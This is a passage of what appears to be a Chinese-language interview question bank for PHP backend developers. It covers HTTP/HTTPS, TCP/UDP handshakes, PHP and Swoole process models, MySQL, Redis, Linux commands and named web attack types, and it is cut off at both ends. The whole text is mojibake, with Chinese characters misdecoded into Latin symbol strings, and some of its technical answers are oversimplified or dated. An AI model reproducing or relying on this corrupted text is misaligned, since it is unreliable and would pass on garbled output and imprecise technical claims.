è¾“ï¼Œæ•°æ®éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œè€Œhttps åˆ™æ˜¯ ssl + http åè®®è¿›è¡ŒåŠ å¯†ä¼ è¾“ã€‚ http æ¯” https è¦å¿«ï¼Œè¿™æ˜¯å› ä¸ºhttp åªéœ€è¦è¿›è¡Œtcp ä¸‰æ¬¡æ¡æ‰‹è¿æ¥ï¼Œåªéœ€è¦äº¤æ¢ä¸‰ä¸ªåŒ…ï¼Œè€Œ https é™¤äº†è¿›è¡Œtcp è¿æ¥ï¼Œè¿˜éœ€è¦ ssl æ¡æ‰‹çš„ä¹ä¸ªåŒ…ï¼Œä¸€å…±æ˜¯åäºŒä¸ªåŒ…ã€‚ https æ˜¯æ„å»ºåœ¨http ä¹‹ä¸Šçš„åè®®ï¼Œç†è®ºä¸Šï¼Œhttps ç›¸è¾ƒ http ä¼šæ›´æ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ session å’Œ cookie çš„åŒºåˆ« å­˜å‚¨æ–¹å¼ä¸åŒï¼šcookie æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œsession åˆ™æ˜¯å­˜å‚¨åœ¨æœåŠ¡ç«¯ã€‚ éšç§ç­–ç•¥ä¸åŒï¼šcookie å› ä¸ºå­˜å‚¨åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œæ‰€ä»¥å¯¹å®¢æˆ·ç«¯æ˜¯å¯è§çš„ï¼Œè€Œsession UDP å’ŒTCP çš„åŒºåˆ«UDP æ˜¯é¢å‘æŠ¥æ–‡çš„ã€ä¸å¯é çš„æ•°æ®æŠ¥åè®®ï¼ŒTCP æ˜¯é¢å‘è¿æ¥çš„ã€å¯é çš„æµåè®®ã€‚ TCP é¢å‘è¿æ¥; UDP ä¸éœ€è¦è¿æ¥ï¼Œå³å‘é€æ•°æ®ä¹‹å‰ä¸éœ€è¦å»ºç«‹è¿æ¥; TCPæä¾›å¯é çš„æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡TCPè¿æ¥ä¼ é€çš„æ•°æ®ï¼Œæ— å·®é”™ï¼Œä¸ä¸¢å¤±ï¼Œä¸é‡å¤ï¼Œä¸”æŒ‰åºåˆ°è¾¾; UDPå°½æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œå³ä¸ä¿ä¿è¯å¯é äº¤ä»˜ TCPé¢å‘å­—èŠ‚æµï¼Œå®é™…ä¸Šæ˜¯TCPæŠŠæ•°æ®çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµ; UDPæ˜¯é¢å‘æŠ¥æ–‡çš„ï¼ŒUDPæ²¡æœ‰æ‹¥å¡æ§åˆ¶ï¼Œå› æ­¤ç½‘ç»œå‡ºç°æ‹¥å¡ä¸ä¼šä½¿æºä¸»æœºçš„å‘é€é€Ÿç‡é™ä½ æ¯ä¸€æ¡TCPè¿æ¥åªèƒ½æ˜¯ç‚¹åˆ°ç‚¹çš„;UDPæ”¯æŒä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ TCPé¦–éƒ¨å¼€é”€20å­—èŠ‚;UDPçš„é¦–éƒ¨å¼€é”€å°ï¼Œåªæœ‰8ä¸ªå­—èŠ‚ TCPçš„é€»è¾‘é€šä¿¡ä¿¡é“æ˜¯å…¨åŒå·¥çš„å¯é ä¿¡é“ï¼ŒUDPåˆ™æ˜¯ä¸å¯é ä¿¡é“ è¯´ä¸€è¯´TCP çš„â€œç²˜åŒ…â€é—®é¢˜ ç»“è®ºï¼šTCP çš„â€œç²˜åŒ…â€é—®é¢˜å…¶å®æ˜¯ä¸€ä¸ªä¼ªå‘½é¢˜ã€‚ æœåŠ¡ç«¯å»ºç«‹æœåŠ¡ï¼Œå®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯æ¯æ¬¡sendï¼Œå®¢æˆ·ç«¯éƒ½èƒ½æ­£å¸¸recvï¼Œä½†åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„ä¸¤æ¬¡sendæˆ–è€…å¤šæ¬¡sendï¼Œå®¢æˆ·ç«¯å¯èƒ½åªæœ‰ä¸€æ¬¡recväº†ã€‚è¿™å°±å¯¼è‡´äº†æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜çš„äº§ç”Ÿã€‚ TCP åè®®çš„æœ¬è´¨æ˜¯æµåè®®ï¼Œå®ƒåªä¼šä¿è¯ä»¥ä»€ä¹ˆé¡ºåºå‘é€å­—èŠ‚ï¼Œæ¥å—æ–¹å°±ä¸€å®šèƒ½æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥æ”¶åˆ°ï¼Œæ‰€ä»¥æ‰€è°“çš„ç²˜åŒ…é—®é¢˜ä¸åº”è¯¥æ˜¯ä¼ è¾“å±‚é¢çš„é—®é¢˜ï¼Œè€Œæ˜¯åº”ç”¨å±‚é¢çš„é—®é¢˜ã€‚ ç®€è¿°TCP ä¸‰æ¬¡æ¡æ‰‹æ¦‚å¿µï¼šæŒ‡åœ¨å‘é€æ•°æ®çš„å‡†å¤‡é˜¶æ®µï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´éœ€è¦ä¸‰æ¬¡äº¤äº’ã€‚ ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªSYNåŒ…ï¼Œå¹¶è¿›å…¥SYN_SENT çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡ç«¯ç¡®è®¤ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šå½“æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œæ­¤æ—¶è¦ç»™å®¢æˆ·ç«¯ä¸€ä¸ªç¡®è®¤ä¿¡æ¯ACKï¼ŒåŒæ—¶å‘é€SYNæŠ¥ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥ SYN_RECV çŠ¶æ€ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘çš„ACK + SYN åŒ…åï¼Œå‘æœåŠ¡å™¨å‘é€ACKï¼Œå‘é€å®Œæ¯•ä¹‹åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥TCP è¿æ¥æˆåŠŸçŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚ ä¸ºä»€ä¹ˆæ¡æ‰‹ä¸€å®šè¦ä¸‰æ¬¡ï¼Œä¸èƒ½ä¸¤æ¬¡å—ï¼Ÿ è¿™æ˜¯ä¸ºäº†é˜²æ­¢å·²ç»å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡çªç„¶åˆä¼ åˆ°Tcp æœåŠ¡å™¨ï¼Œé¿å…äº§ç”Ÿé”™è¯¯ã€‚ ç®€è¿°TCP å››æ¬¡æŒ¥æ‰‹æ¦‚å¿µï¼šæ‰€è°“å››æ¬¡æŒ¥æ‰‹å°±æ˜¯è¯´å…³é—­TCP è¿æ¥çš„è¿‡ç¨‹ï¼Œå½“æ–­å¼€ä¸€ä¸ªTCP è¿æ¥æ—¶ï¼Œéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å…±å…±å‘é€å››ä¸ªåŒ…ç¡®è®¤ã€‚ ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ•°æ®ä¼ è¾“ï¼Œå®¢æˆ·ç«¯è¿›å…¥ fin_wait çŠ¶æ€ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°fin åï¼Œå‘é€ä¸€ä¸ªack ç»™å®¢æˆ·ç«¯ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ï¼ŒæœåŠ¡å™¨è¿›å…¥close_wait çŠ¶æ€ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡å™¨å‘é€ä¸€ä¸ªfin ç”¨æ¥å…³é—­æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ•°æ®ä¼ è¾“ï¼ŒæœåŠ¡å™¨è¿›å…¥ last_ack çŠ¶æ€ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°fin åï¼Œå®¢æˆ·ç«¯è¿›å…¥time_wait çŠ¶æ€ï¼Œæ¥ç€å‘é€ä¸€ä¸ªack ç»™æœåŠ¡å™¨ï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°åºå·+1ï¼ŒæœåŠ¡å™¨è¿›å…¥ closed çŠ¶æ€ï¼Œå®Œæˆå››æ¬¡æŒ¥æ‰‹ã€‚ å»ºç«‹socket éœ€è¦å“ªäº›æ­¥éª¤ åˆ›å»ºsocket ç»‘å®šsocket åˆ°æŒ‡å®šåœ°å€å’Œç«¯å£ å¼€å§‹ç›‘å¬è¿æ¥ è¯»å–å®¢æˆ·ç«¯è¾“å…¥ å…³é—­ socket ç®€è¿°ä»æµè§ˆå™¨è¾“å…¥ a.com å›è½¦ä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆ DNS åŸŸåè§£æï¼Œå¯»æ‰¾å¯¹åº”çš„IP åœ°å€ æ ¹æ®è¿™ä¸ªIP æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å™¨ï¼Œå»ºç«‹TCP è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ TCP å»ºè¿ä¹‹åï¼Œå‘èµ·HTTP è¯·æ±‚ æœåŠ¡å™¨å“åº” HTTP è¯·æ±‚ å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è§£æå¹¶æ¸²æŸ“é¡µé¢ æœåŠ¡å™¨å…³é—­TCP è¿æ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ é•¿è¿æ¥ä¸çŸ­è¿æ¥çš„åŒºåˆ«çŸ­è¿æ¥ä¸ºæ¯ä¸€æ¬¡çš„æ•°æ®ä¼ è¾“å‡†å¤‡äº†ä¸€ä¸ªä¼ è¾“é€šé“ï¼Œè€Œé•¿è¿æ¥åˆ™æ˜¯å»ºç«‹ä¸€æ¡é€šé“ï¼Œå¹¶ä¸€ç›´ä¿æŒï¼Œæ¯ä¸€æ¬¡ä¼ è¾“æ—¶éƒ½ä¼šå¤ç”¨åŒä¸€æ¡è¿æ¥é€šé“ã€‚ WebsocketWebsocket æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œè¿æ¥åˆšå¼€å§‹è¿˜æ˜¯HTTP åè®®ï¼Œç”±å®¢æˆ·ç«¯å‘èµ·ï¼Œç„¶ååˆ‡æ¢æˆWebsocket åè®®ã€‚ å®ƒçš„å­˜åœ¨ï¼Œç”±è½®è¯¢å˜æˆäº†å®¢æˆ·ç«¯å¯ä»¥ä¸»åŠ¨å‘æœåŠ¡ç«¯å‘é€æ¶ˆæ¯ã€‚ ä»€ä¹ˆæ˜¯è½®è¯¢ï¼Ÿ è½®è¯¢æ˜¯ä¸€ç§è·å–ä¿¡æ¯çš„æ–¹å¼ã€‚ PHPç¯‡å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’çš„åŒºåˆ«å€¼ä¼ é€’ï¼šä¼ é€’çš„æ˜¯å˜é‡åœ¨å†…å­˜ä¸­çš„å‰¯æœ¬ã€‚å¼•ç”¨ä¼ é€’ï¼šä¼ é€’çš„æ˜¯å˜é‡åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ unset å¹¶ä¸ä¼šçœŸæ­£æ„ä¹‰ä¸Šæ³¨é”€ä¸€ä¸ªå˜é‡ï¼Œè€Œæ˜¯åˆ‡æ–­äº†å˜é‡åå’Œå®é™…å€¼ä¹‹é—´çš„å…³ç³»ï¼Œå…¶å˜é‡åªè¦è¿˜è¢«å¼•ç”¨å°±è¿˜æ²¡æœ‰è¢«é‡Šæ”¾ã€‚ composer è‡ªåŠ¨åŠ è½½åŸç†composer çš„æ ¸å¿ƒåŠ è½½æ€æƒ³æ˜¯é€šè¿‡composer çš„autoload.phpï¼Œå°†ç±»å’Œè·¯å¾„çš„å¯¹åº”å…³ç³»åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæœ€åå°†å…·ä½“çš„åŠ è½½å®ç°æ³¨å†Œåˆ° spl_autoload_register å‡½æ•°ä¸­ã€‚ å¸¸ç”¨çš„è¯·æ±‚ç¬¬ä¸‰æ–¹æ¥å£æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿ curl file_get_contents fopen æŠ½è±¡ç±»å’Œæ¥å£ç±»çš„åŒºåˆ«æŠ½è±¡ç”¨äºæè¿°ä¸åŒçš„äº‹ç‰©ï¼Œæ¥å£ç”¨äºæè¿°äº‹ç‰©çš„è¡Œä¸º è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«è¿›ç¨‹æ˜¯CPU åˆ†é…å†…å­˜çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPU è°ƒåº¦çš„æœ€å°å•ä½ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹ã€‚ Swoole çš„è¿›ç¨‹æ¨¡å‹Swoole çš„è¿›ç¨‹æ¨¡å‹é‡‡ç”¨ä¸»è¿›ç¨‹ã€ç®¡ç†è¿›ç¨‹ã€å¼‚æ­¥ä»»åŠ¡/å·¥ä½œè¿›ç¨‹åä½œçš„æ–¹å¼ã€‚ Manager è¿›ç¨‹ä¸»è¦è´Ÿè´£åˆ›å»º/å›æ”¶ worker/task è¿›ç¨‹ Reactor è¿›ç¨‹ä¸»è¦è´Ÿè´£ç»´æŠ¤å®¢æˆ·ç«¯ TCP è¿æ¥ã€å¤„ç†ç½‘ç»œ IOã€å¤„ç†åè®®ã€æ”¶å‘æ•°æ® Worker/Task è¿›ç¨‹ä¸»è¦è´Ÿè´£æ‰§è¡ŒPHP ä»£ç ã€‚ PHP çš„è¿›ç¨‹æ¨¡å‹åœ¨LNMP çš„æ¨¡å¼ä¸‹ï¼ŒPHP æ˜¯php-fpm å¤šè¿›ç¨‹+é˜»å¡I/O çš„è¿›ç¨‹æ¨¡å‹ã€‚ åŒæ­¥ã€å¼‚æ­¥ã€é˜»å¡ã€éé˜»å¡æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ åŒæ­¥å’Œå¼‚æ­¥æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æœºåˆ¶ã€‚ é˜»å¡å’Œéé˜»å¡æ˜¯ä¸€ç§ä¸šåŠ¡æµç¨‹å¤„ç†æ–¹å¼ã€‚ IO å¤šè·¯å¤ç”¨ï¼šç”¨ä¸€ä¸ªçº¿ç¨‹æ¥æ£€æŸ¥Socket çš„å°±ç»ªçŠ¶æ€ã€‚ å¹¶å‘ã€å¹¶è¡Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå¹¶å‘ï¼šä¸¤ä»¶æˆ–è€…å¤šä»¶äº‹æƒ…åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿå¹¶è¡Œï¼šä¸¤ä»¶æˆ–è€…å¤šä»¶äº‹æƒ…åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿ åŒºåˆ«åœ¨ä¸ï¼šåœ¨åŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¯¹äºå¹¶è¡Œæ¥è¯´ï¼Œäº‹ä»¶æ˜¯ä¸€å¹¶å‘ç”Ÿï¼Œè€Œå¯¹äºå¹¶å‘æ¥è¯´ï¼Œåœ¨å®è§‚çœ‹æ¥ä¹Ÿæ˜¯ä¸€å¹¶å‘ç”Ÿï¼Œä½†åœ¨å¾®è§‚ä¸Šå´æ˜¯äº¤æ›¿å‘ç”Ÿã€‚ ç®€è¿°PHP ä»£ç è§£æè¿‡ç¨‹Zend å¼•æ“é¦–å…ˆä¼šå°†PHP ä»£ç è¿›è¡Œè§£æï¼ˆè¯æ³•ã€è¯­æ³•è§£æï¼‰æˆ opcodeï¼Œç„¶åZend è™šæ‹Ÿæœºä¼šé¡ºåºæ‰§è¡Œè¿™äº›æŒ‡ä»¤ã€‚ ä»LNMP çš„è§’åº¦ç®€è¿°ä¸€æ¬¡å®Œæ•´çš„è¯·æ±‚è¿‡ç¨‹å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼ŒWeb Server é¦–å…ˆä¼šåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯é™æ€è¿˜æ˜¯åŠ¨æ€ï¼Ÿå¦‚æœæ˜¯é™æ€ï¼Œç›´æ¥è¿”å›å¯¹åº”çš„é™æ€èµ„æºã€‚å¦‚æœæ˜¯åŠ¨æ€ï¼ŒFastCGI ä¼šå°†è¯¥è¯·æ±‚è½¬å‘ç»™æœ¬åœ° 9000 ç«¯å£ï¼ˆ9000 æ˜¯ PHPâ€”FPM æ‰€ç›‘å¬çš„ç«¯å£ï¼‰ï¼ŒPHP-FPM ä¸»è¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šåˆ†é…ä¸€ä¸ªç©ºé—²çš„ Worker è¿›ç¨‹å»å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¤„ç†å®Œæˆä¹‹åå°†æ•°æ®è¿”å›ç»™ FastCGIï¼Œå†ç”± Nginx è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ PHP å¯ä»¥åšå¸¸é©»å†…å­˜å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿä¼ ç»Ÿçš„PHP æ— æ³•ä»¥å¸¸é©»å†…å­˜çš„æ–¹å¼è¿è¡Œï¼Œè¿™æ˜¯å› ä¸ºPHPæ˜¯è§£é‡Šå‹è„šæœ¬è¯­è¨€ï¼Œè¿™ç§è¿è¡Œæœºåˆ¶ä½¿å¾—æ¯ä¸ªPHP é¡µé¢è§£é‡Šæ‰§è¡Œåï¼Œæ‰€æœ‰èµ„æºéƒ½è¢«å›æ”¶äº†ã€‚ é€šå¸¸å¦‚ä½•å®ç°ç”¨æˆ·ç™»å½•ï¼ˆAPIï¼‰æœ‰ä¸¤ç§æ–¹å¼ï¼šä¸€ç§æ˜¯æ™®é€šçš„ token ä»¤ç‰Œï¼Œå¦ä¸€ç§åˆ™æ˜¯JWTã€‚ æ™®é€šTokenï¼šç”¨æˆ·åˆæ¬¡ç™»å½•ä¼šæºå¸¦ç”¨æˆ·åå’Œå¯†ç ç­‰ä¿¡æ¯ï¼ŒæœåŠ¡ç«¯éªŒè¯é€šè¿‡ä¹‹åï¼Œä¼šç»™å®¢æˆ·ç«¯è¿”å›ä¸€ä¸ªTokenã€‚è¿™ä¸ªToken å¯ä»¥æ˜¯ç”±ç”¨æˆ·åã€å¯†ç ã€ç™»å½•è®¾å¤‡ã€ç™»å½•IP ç­‰ä¿¡æ¯åŠ å¯†ä¹‹åç»„æˆï¼Œä»¥åçš„å®¢æˆ·ç«¯æ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šæºå¸¦è¿™ä¸ªTokenï¼ŒæœåŠ¡ç«¯åˆ™ä¼šéªŒè¯è¯¥Tokenã€‚ åœ¨PHPä¸­ï¼Œä½ æ˜¯å¦‚ä½•æ•è·å¼‚å¸¸çš„ï¼Ÿå°½é‡é¿å…ä½¿ç”¨exitã€dieæ–¹æ³•ç›´æ¥é€€å‡ºï¼Œè€Œä½¿ç”¨try...catchæ¥æ•è·å¼‚å¸¸ã€‚ å¸¸è§è®¾è®¡æ¨¡å¼åˆ›é€ å‹ï¼šå·¥å‚æ¨¡å¼ã€å•ä¾‹æ¨¡å¼ã€åŸå‹æ¨¡å¼ç»“æ„å‹ï¼šé€‚é…å™¨æ¨¡å¼ã€è£…é¥°æ¨¡å¼ã€é—¨é¢æ¨¡å¼ã€ä»£ç†æ¨¡å¼è¡Œä¸ºå‹ï¼šè¿­ä»£å™¨æ¨¡å¼ã€ä¸­ä»‹æ¨¡å¼ã€è§‚å¯Ÿè€…æ¨¡å¼ ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥ä¾èµ–æ³¨å…¥ä¸»è¦ç”¨æ¥å‡å°‘ä»£ç é—´çš„è€¦åˆï¼Œæœ‰æ•ˆåˆ†ç¦»å¯¹è±¡å’Œå®ƒæ‰€éœ€è¦çš„å¤–éƒ¨èµ„æºã€‚ Mysqlç¯‡Mysql çš„InnoDb å’ŒMyISAM å¼•æ“æœ‰ä½•ä¸åŒï¼Ÿ InnoDb çš„ç‰¹ç‚¹åŒ…æ‹¬ï¼šäº‹åŠ¡ã€é” InnoDb æ”¯æŒ ACID çš„äº‹åŠ¡ 4ä¸ªç‰¹æ€§ï¼ŒMyISAM ä¸æ”¯æŒäº‹åŠ¡ã€‚ InnoDB æ”¯æŒè¡Œçº§åˆ«çš„é”ç²’åº¦ï¼ŒMyISAM ä¸æ”¯æŒï¼Œåªæ”¯æŒè¡¨çº§åˆ«çš„é”ç²’åº¦ã€‚ ä»€ä¹ˆæ˜¯ACIDï¼ˆäº‹åŠ¡çš„å››ä¸ªç‰¹æ€§ï¼‰ï¼Ÿ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆï¼Œä¸ä¼šç»“æŸåœ¨æŸä¸ªä¸­é—´ç¯èŠ‚ã€‚ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä¹‹åï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§é™åˆ¶æœªè¢«ç ´åã€‚ éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹åŠ¡çš„æ‰§è¡Œæ˜¯äº’ä¸å¹²æ‰°çš„ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸å¯èƒ½çœ‹åˆ°å…¶ä»–äº‹åŠ¡è¿è¡Œæ—¶ï¼Œä¸­é—´æŸä¸€æ—¶åˆ»çš„æ•°æ®ã€‚ æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡å®Œæˆä¹‹åï¼Œäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹è¿›è¡ŒæŒä¹…åŒ–ä¿å­˜ï¼Œä¸ä¼šä¸¢å¤±ã€‚ Mysql æœ‰å‡ ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Ÿæœ‰å››ç§éš”ç¦»çº§åˆ«ã€‚ æ­»é”æ˜¯ä»€ä¹ˆï¼Ÿä¸¤ä¸ªæˆ–å¤šä¸ªäº‹åŠ¡åœ¨åŒä¸€ä¸ªèµ„æºä¸Šç›¸äº’å ç”¨ã€‚ ç®€è¿°Mysql ç´¢å¼•ã€ä¸»é”®åŠå…¶å¸¸è§ç´¢å¼•ç´¢å¼•å°±æ˜¯ç±»ä¼¼äºä¹¦ç±ç›®å½•çš„å­˜åœ¨ï¼Œä¸»é”®æ˜¯ç”¨äºç¡®å®šå­—æ®µçš„å”¯ä¸€æ€§ã€‚ æ™®é€šç´¢å¼•ï¼šæœ€æ™®é€šçš„ç´¢å¼•ï¼Œä½¿ç”¨æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ã€‚ å”¯ä¸€ç´¢å¼•ï¼šä¸æ™®é€šç´¢å¼•ç±»å‹ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œåˆ—å€¼ä¸å…è®¸é‡å¤ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ã€‚ ä¸»é”®ç´¢å¼•ï¼šä¸»é”®æœ¬èº«è‡ªå¸¦çš„ç´¢å¼•ï¼Œä¸å…è®¸æœ‰ç©ºå€¼ã€‚ å…¨æ–‡ç´¢å¼•ï¼šä»…å¯ç”¨äº MyISAM è¡¨ï¼Œé’ˆå¯¹è¾ƒå¤§çš„æ•°æ®ï¼Œç”Ÿæˆå…¨æ–‡ç´¢å¼•å¾ˆè€—æ—¶å ç©ºé—´ ç»„åˆç´¢å¼•ï¼šä¸ºäº†æé«˜å¤šæ¡ä»¶æŸ¥è¯¢æ•ˆç‡ï¼Œå¯å»ºç«‹ç»„åˆç´¢å¼•ï¼Œéµå¾ªâ€æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™â€ ä½†æ˜¯ç´¢å¼•ä¹Ÿä¸æ˜¯è¶Šå¤šè¶Šå¥½ï¼Œç´¢å¼•åŠ å¿«äº†æŸ¥è¯¢é€Ÿåº¦ï¼Œä½†åŒæ—¶ä¹Ÿä¼šå½±å“æ›´æ–°é€Ÿåº¦ã€‚ Redisç¯‡Redis å’ŒMemcache çš„åŒºåˆ« Redis æ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼ŒMemcache åªæ”¯æŒKey-Value Redis æ”¯æŒä¸¤ç§æŒä¹…åŒ–ï¼ŒMemcache ä¸æ”¯æŒæŒä¹…åŒ–ã€‚ Redis çš„å¸¸è§æ•°æ®ç»“æ„åŠå…¶åº”ç”¨åœºæ™¯ å­—ç¬¦ä¸² å“ˆå¸Œ åˆ—è¡¨ æ— åºåˆ—è¡¨ é›†åˆ Redis çš„æŒä¹…åŒ–æœ‰å‡ ç§æ–¹æ¡ˆï¼Ÿæœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ï¼šRDBã€AOFã€æ··åˆã€‚ RDBï¼šå°†æŸä¸€æ—¶åˆ»çš„æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥åˆ°ç£ç›˜é‡Œï¼ŒæœåŠ¡é‡å¯æ—¶æ£€æµ‹åˆ°å¯¹åº”æ–‡ä»¶è‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ï¼Œæœ‰æ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ä¸¤ç§æœºåˆ¶ã€‚ AOFï¼šä»¥æ–‡ä»¶è¿½åŠ çš„æ–¹å¼å†™å…¥å®¢æˆ·ç«¯æ‰§è¡Œçš„å†™å‘½ä»¤ï¼Œæ•°æ®æ¢å¤æ—¶ï¼Œé€šè¿‡åˆ›å»ºä¼ªå®¢æˆ·ç«¯çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œç›´åˆ°æ¢å¤å®Œæˆã€‚ æ··åˆï¼šåœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ ä¸ºä»€ä¹ˆRedis æ˜¯å•çº¿ç¨‹ï¼ŸLinuxç¯‡è¯´ä¸€ä¸‹ä½ å¸¸ç”¨çš„Linux å‘½ä»¤ï¼ˆæœ€åŸºç¡€çš„ä¸ç”¨è¯´ï¼‰ ç½‘ç»œï¼špingã€tcppingã€telnetã€netstatã€nmapã€lsofã€tcpdump ç£ç›˜ï¼šdfã€du è¿›ç¨‹ï¼špsã€pstree å†…å­˜ï¼šfree è´Ÿè½½ï¼štop å‹æµ‹å·¥å…·ï¼šabã€wrk æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½ï¼šcurlã€wgetã€scp ç»¼åˆï¼šglances åŸºæœ¬çš„è¿ç»´éœ€è¦ç›‘æ§å“ªäº›æ•°æ®ï¼Ÿ ç³»ç»Ÿå±‚ï¼šCPUã€å†…å­˜ã€è´Ÿè´£ã€ç½‘å¡ã€I/O åº”ç”¨å±‚ï¼šQPSã€APIå“åº”æ—¶é•¿ã€Rediså†…å­˜ä½¿ç”¨é‡ã€ä»»åŠ¡é˜Ÿåˆ—æ•°ã€php-fpm è¿›ç¨‹æ•°ã€Mysqlçº¿ç¨‹æ•° å¥åº·å·¡æŸ¥ï¼šdns è§£æã€ip æ˜¯å¦å¯ä»¥è®¿é—®ã€ç¡¬ç›˜ã€å„ç§åŸºç¡€æœåŠ¡ å…¶ä»–è¯´ä¸€è¯´ä½ æ‰€çŸ¥é“çš„ç½‘ç«™æ”»å‡»æ–¹å¼åŠå¦‚ä½•é˜²èŒƒ CSRF è·¨ç«™ä¼ªé€ è¯·æ±‚ XSS è·¨ç«™è„šæœ¬æ”»å‡» SQL æ³¨å…¥ DDOS æ”»å‡» å¦‚æœç”¨æˆ·åé¦ˆç½‘ç«™æ…¢ï¼Œä½ ä¼šæ€æ ·åšï¼Ÿ èµ„æºåŠ è½½æ…¢i. WebServer é…ç½®é™æ€èµ„æºç¼“å­˜ã€åŠ¨é™åˆ†ç¦»ii. DNS ç¼“å­˜ã€CDN åŠ é€Ÿiii. å¢åŠ 